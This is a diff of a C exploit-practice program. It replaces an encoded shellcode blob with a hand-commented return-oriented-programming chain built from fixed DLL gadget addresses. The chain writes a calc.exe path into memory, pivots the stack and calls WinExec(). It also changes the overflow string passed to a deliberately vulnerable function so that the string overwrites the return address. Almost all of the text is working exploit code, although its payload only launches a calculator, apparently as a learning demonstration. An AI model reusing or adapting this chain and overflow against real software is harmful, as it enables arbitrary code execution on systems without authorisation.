@@ -11,17 +11,117 @@ void vulnerable_function(char *str)
 void	shellcode()
 {
 
-	unsigned char code[] = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
-								"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
-								"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
-								"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"
-								"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"
-								"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
-								"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
-								"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
-								"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
-								"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
-								"\x7f\xe8\x7b\xca";
+	unsigned char code[] = 
+"\xb1\x4f\x97\x7c"  // POP ECX # RETN
+"\xf9\x10\x47\x7e"  // Writable PTR USER32.dll
+"\x27\xfa\x87\x7c"  // POP EDX # POP EAX # RETN
+"\x43\x3a\x5c\x57"  // ASCII "C:\W"
+"\x49\x4e\x44\x4f"  // ASCII "INDO"
+"\x04\x18\x80\x7c"  // MOV DWORD PTR DS:[ECX],EDX # MOV DWORD PTR DS:[ECX+4],EAX # POP EBP # RETN 04
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\xe5\x02\x88\x7c"  // POP EAX # RETN
+"\x57\x53\x5c\x73"  // ASCII "WS\s"
+"\x38\xd6\x46\x7e"  // MOV DWORD PTR DS:[ECX+8],EAX # POP ESI # POP EBP # RETN 08
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\xe5\x02\x88\x7c"  // POP EAX # RETN
+"\x79\x73\x74\x65"  // ASCII "yste"
+"\xcb\xbe\x45\x7e"  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\xe5\x02\x88\x7c"  // POP EAX # RETN
+"\x63\x61\x6c\x63"  // ASCII "calc"
+"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x07\x3d\x96\x7c"  // INC ECX # RETN
+"\x07\x3d\x96\x7c"  // INC ECX # RETN
+"\x07\x3d\x96\x7c"  // INC ECX # RETN
+"\x07\x3d\x96\x7c"  // INC ECX # RETN
+"\xe5\x02\x88\x7c"  // POP EAX # RETN
+"\x6d\x33\x32\x5c"  // ASCII "m32\"
+"\xcb\xbe\x45\x7e"  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\xe5\x02\x88\x7c"  // POP EAX # RETN
+"\x2e\x65\x78\x65"  // ASCII ".exe"
+"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x07\x3d\x96\x7c"  // INC ECX # RETN
+"\x07\x3d\x96\x7c"  // INC ECX # RETN
+"\x07\x3d\x96\x7c"  // INC ECX # RETN
+"\x07\x3d\x96\x7c"  // INC ECX # RETN
+"\x9e\x2e\x92\x7c"  // XOR EAX,EAX # RETN
+"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\xee\x4c\x97\x7c"  // DEC ECX # RETN
+"\xee\x4c\x97\x7c"  // DEC ECX # RETN
+"\xee\x4c\x97\x7c"  // DEC ECX # RETN
+"\xee\x4c\x97\x7c"  // DEC ECX # RETN
+"\xee\x4c\x97\x7c"  // DEC ECX # RETN
+"\xee\x4c\x97\x7c"  // DEC ECX # RETN
+"\xee\x4c\x97\x7c"  // DEC ECX # RETN
+"\xee\x4c\x97\x7c"  // DEC ECX # RETN
+//-------------------------------------------["C:\WINDOWS\system32\calc.exe+00000000" -> ecx]-//
+"\xe5\x02\x88\x7c"  // POP EAX # RETN
+"\x7a\xeb\xc3\x6f"  // Should result in a valid PTR in kernel32.dll
+"\x4f\xda\x85\x7c"  // PUSH ESP # ADC BYTE PTR DS:[EAX+CC4837C],AL # XOR EAX,EAX # INC EAX # POP EDI # POP EBP # RETN 08
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x32\xd9\x44\x7e"  // XCHG EAX,EDI # RETN
+"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
+"\x8a\x20\x87\x7c"  // Compensate POP
+//-----------------------------------------------------------[Save Stack Pointer + pivot eax]-//
+"\xd6\xd1\x95\x7c"  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x33\x80\x97\x7c"  // INC EAX # RETN
+"\x33\x80\x97\x7c"  // INC EAX # RETN
+"\x33\x80\x97\x7c"  // INC EAX # RETN
+"\x33\x80\x97\x7c"  // INC EAX # RETN
+"\xf5\xd6\x91\x7c"  // XOR ECX,ECX # RETN
+"\x07\x3d\x96\x7c"  // INC ECX # RETN
+"\xd6\xd1\x95\x7c"  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\xb1\x4f\x97\x7c"  // POP ECX # RETN
+"\xed\x2a\x86\x7c"  // WinExec()
+"\xe7\xc1\x87\x7c"  // MOV DWORD PTR DS:[EAX+4],ECX # XOR EAX,EAX # POP EBP # RETN 04
+"\x8a\x20\x87\x7c"  // Compensate POP
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Compensate RETN
+"\x8a\x20\x87\x7c"  // Final RETN for WinExec()
+"\x8a\x20\x87\x7c"; // Compensate WinExec()
+//------------------------------------------------------[Write Arguments and execute -> calc]-//
 	((void (*)())code)();
 
 }
@@ -31,7 +131,7 @@ int main(int argc, char **argv)
 	(void) argc;
 	(void) argv;
 	printf("%p", &shellcode);
-	vulnerable_function("09874500064888675436\x05\x10\x40\x00");
+	vulnerable_function("09874500064888675436\x80\x10\x40\x00");
 
 	return (0);
 }
